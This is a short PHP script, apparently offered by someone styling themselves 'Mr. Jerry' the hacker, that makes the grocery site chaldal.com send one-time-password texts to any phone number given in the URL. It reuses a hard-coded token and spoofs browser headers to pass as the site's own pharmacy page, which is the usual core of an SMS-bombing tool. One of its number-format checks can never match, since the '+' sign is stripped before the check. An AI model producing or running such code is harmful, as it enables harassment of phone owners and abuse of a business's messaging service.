<?php

// Get the phone number from the URL query string
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';

// Format the phone number to ensure it's 11 digits
$formattedPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);

// Ensure the phone number is 11 digits
if (strlen($formattedPhone) === 11 && $formattedPhone[0] === '0') {
    // Remove the leading "0"
    $phoneToUse = substr($formattedPhone, 1);
} elseif (strlen($formattedPhone) === 10) {
    // If it’s already 10 digits, use it as is
    $phoneToUse = $formattedPhone;
} elseif (strlen($formattedPhone) === 13 && substr($formattedPhone, 0, 4) === '+88') {
    // If it’s in the format +88XXXXXXXXXX, remove the country code
    $phoneToUse = substr($formattedPhone, 3);
} else {
    echo "Invalid phone number. Please provide an 11-digit phone number.";
    exit;
}

// Prepare the data for the GET request
$apiKey = '03AFcWeA7ORc5evEDdga7iPOwFwbwbueszGq-i__cA0SRaHVFcTr48OLW8cq4Qs7s-WXmLpolllTrqcMZJm1m8uJjVCER8Z7RLbjgMpIKNr0www6XYCqp0Ei5Qjw5XiEyPtu-BfGQpoOYr5hmw40RiBFAsscthFAlIKNFYf79eAVWqxJhormessY_Qe8T1hUGrymB7i72h9akuBsrawXB37NGk2P7XPMd_gumRO1IE0t-EVJ-Enw72NpOlza9A8f_A0lAewgAlkLqrV8bA7SaYvvGjQZHrsHf8oRNa1DPBwxWIXMOiO8UdMPLqGx5DE66IZEFhymla_1x4vlR5cPZgjFuCshZ8HobWmNnkV8BQFGIJ9ShoHOycbPF79gisnDxEE1Q6Y9gVQtJ01aCQY0Zhl61REcBjQJnTImvEh8crW5r70K7OieWkeMb_ePh9cqksBz5jPEjfI463TOgbgqG0D5xZURxn3QlB_W3acKQP-2jDCa-CDtuqmRfnz4mzflqwmrlNC1rCsljnTXAje0eVMwLUaIZ4FdREJeTF6sFHvguuqjEvpDuMjeKnrPSn_BKbZVmlu5pYeFBVGjgfRRffKvVTUI5PziLc70zl0KGb_97aQvSRlx6CcWKTl3uIFKq3ddPckbmyVj5HXmmq5_4NsijHefnjFzJq-BRnajd1eBTCs_0NWOFZ2tYFWT4voxI4zMQFtqC9UVRiiMx_8x89yT1NI2zVHDeP8dLary6GzyP8FfCUawfDsggOqqIdCjFNmUX_u1xgQU-NfXPYyAvvOiYpKHLK7Dsplb4cvP_qZ8alGJZ6jSzZyvm9FI9ruR8fYXp5-hS9rj8DGJLwKA-FZ3CNsXoxqXrGzA';
$phoneNumber = '+880' . $phoneToUse;
$retryAttempt = 0;

$url = "https://chaldal.com/yolk/api-v4/Auth/RequestOtpWithApiKey?apiKey=$apiKey&phoneNumber=$phoneNumber&retryAttempt=$retryAttempt";

// Initialize cURL
$ch = curl_init($url);

// Set the necessary options for cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json',
    'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
    'Cache-Control: no-cache',
    'Content-Type: application/json',
    'Origin: https://chaldal.com',
    'Referer: https://chaldal.com/pharmacy',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'X-Egg-Clientapp: Omelette',
    'X-Egg-Platform: Browser',
    'X-Egg-Storeid: 33',
]);

// Execute the cURL request
$response = curl_exec($ch);

// Close the cURL session
curl_close($ch);

// Output the success message
if ($response) {
    echo "Success Response: \n";
    echo "Api Owner : Mɾ. Jҽɾɾყ 😈\n";
    echo "Telegram : t.me/Mr_Jerry_Hacker\n";
} else {
    echo "Failed to send OTP. Please try again.";
}

?>
